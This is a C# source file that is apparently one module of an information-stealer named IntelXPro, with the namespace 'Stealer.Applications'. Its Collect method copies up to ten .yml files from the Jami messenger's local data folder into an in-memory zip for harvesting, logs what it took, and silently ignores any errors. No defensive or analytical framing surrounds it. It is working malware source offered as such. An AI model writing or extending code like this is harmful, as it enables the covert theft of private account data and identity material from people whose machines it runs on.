using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Jami : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "jami");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Jami";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                try
                {
                    string[] ymlFiles = Directory.GetFiles(appDataPath, "*.yml", SearchOption.AllDirectories);
                    
                    foreach (string file in ymlFiles.Take(10))
                    {
                        string relativePath = file.Substring(appDataPath.Length + 1);
                        string zipPath = $"Applications\\Jami\\{relativePath.Replace("\\", "/")}";
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
                catch
                {
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
